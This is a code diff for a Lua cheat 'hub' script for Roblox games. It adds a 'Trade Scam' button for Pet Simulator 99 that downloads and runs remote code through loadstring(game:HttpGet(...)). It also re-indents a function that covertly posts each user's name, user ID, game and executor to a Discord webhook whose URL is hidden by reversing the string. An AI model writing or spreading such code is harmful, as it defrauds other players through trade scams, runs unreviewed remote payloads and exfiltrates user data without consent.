@@ -10,57 +10,57 @@ local DISCORD_WEBHOOK_URL = string.reverse("zuz89P0yCr0WdmXETfrGcQh86y38GMamN3Gm
 local function sendUsageData()
     local success, error_message = pcall(function()
     
-		local response = http_request({
-		    Url = DISCORD_WEBHOOK_URL,
-		    Method = 'POST',
-		    Headers = {
-		        ['Content-Type'] = 'application/json'
-		    },
-		    Body = HttpService:JSONEncode({
-		        ["content"] = "",
-		        ["embeds"] = {{
-		            ["title"] = "LAJ HUB Script Usage!",
-		            ["type"] = "rich",
-		            ["color"] = math.random(0, 0xFFFFFF), -- changed color everytime a pleyah executa;)
-		            ["fields"] = {
-		                {
-		                    ["name"] = "User:",
-		                    ["value"] = "```" .. LocalPlayer.Name .. "```",
-		                    ["inline"] = true
-		                },
-		                {
-		                    ["name"] = "User ID:",
-		                    ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
-		                    ["inline"] = true
-		                },
-		                {
-		                    ["name"] = "Game:",
-		                    ["value"] = "```" .. (game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
-		                    ["inline"] = true
-		                },
-		                {
-		                    ["name"] = "Game ID:",
-		                    ["value"] = "```" .. tostring(game.PlaceId) .. "```",
-		                    ["inline"] = true
-		                },
-		                {
-		                    ["name"] = "Executor",
-		                    ["value"] = "```" .. (identifyexecutor() or "Unknown") .. "```",
-		                    ["inline"] = true
-		                },
-		                {
-		                    ["name"] = "Players Active:",
-		                    ["value"] = "```" .. tostring(Players.NumPlayers) .. "```",
-		                    ["inline"] = true
-		                }
-		            },
-		            ["footer"] = {
-		                ["text"] = "Script Executed on " .. os.date("%Y-%m-%d %H:%M:%S")
-		            }
-		        }}
-		    })
-		})
-		
+                local response = http_request({
+                    Url = DISCORD_WEBHOOK_URL,
+                    Method = 'POST',
+                    Headers = {
+                        ['Content-Type'] = 'application/json'
+                    },
+                    Body = HttpService:JSONEncode({
+                        ["content"] = "",
+                        ["embeds"] = {{
+                            ["title"] = "LAJ HUB Script Usage!",
+                            ["type"] = "rich",
+                            ["color"] = math.random(0, 0xFFFFFF), -- changed color everytime a pleyah executa;)
+                            ["fields"] = {
+                                {
+                                    ["name"] = "User:",
+                                    ["value"] = "```" .. LocalPlayer.Name .. "```",
+                                    ["inline"] = true
+                                },
+                                {
+                                    ["name"] = "User ID:",
+                                    ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
+                                    ["inline"] = true
+                                },
+                                {
+                                    ["name"] = "Game:",
+                                    ["value"] = "```" .. (game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
+                                    ["inline"] = true
+                                },
+                                {
+                                    ["name"] = "Game ID:",
+                                    ["value"] = "```" .. tostring(game.PlaceId) .. "```",
+                                    ["inline"] = true
+                                },
+                                {
+                                    ["name"] = "Executor",
+                                    ["value"] = "```" .. (identifyexecutor() or "Unknown") .. "```",
+                                    ["inline"] = true
+                                },
+                                {
+                                    ["name"] = "Players Active:",
+                                    ["value"] = "```" .. tostring(Players.NumPlayers) .. "```",
+                                    ["inline"] = true
+                                }
+                            },
+                            ["footer"] = {
+                                ["text"] = "Script Executed on " .. os.date("%Y-%m-%d %H:%M:%S")
+                            }
+                        }}
+                    })
+                })
+                
         HttpService:PostAsync(DISCORD_WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson, false)
     end)
     
@@ -114,6 +114,7 @@ local BballZero = Window:CreateTab("Basketball Zero", 4483362458) -- Title, Imag
 local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458) -- Title, Image
 local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458) -- Dead Rails tab
 local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458) -- Blox Fruits tab
+local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Pet Sim 99 tab
 local Universal = Window:CreateTab("Universal", 4483362458) -- Universal scripts tab
 local Settings = Window:CreateTab("Settings", 4483362458)
 -- Note: AdminTab completely removed from this version to ensure it's not accessible
@@ -235,6 +236,15 @@ BloxFruits:CreateButton({
        loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
        
        executednotify("REDz Hub")
+   end,
+})
+
+-- Pet Sim 99 Tab
+PetSim99:CreateButton({
+   Name = "Trade Scam",
+   Callback = function()
+       loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/d74bb729023492c792bc92e9.lua'))()
+       executednotify("Trade Scam")
    end,
 })
 
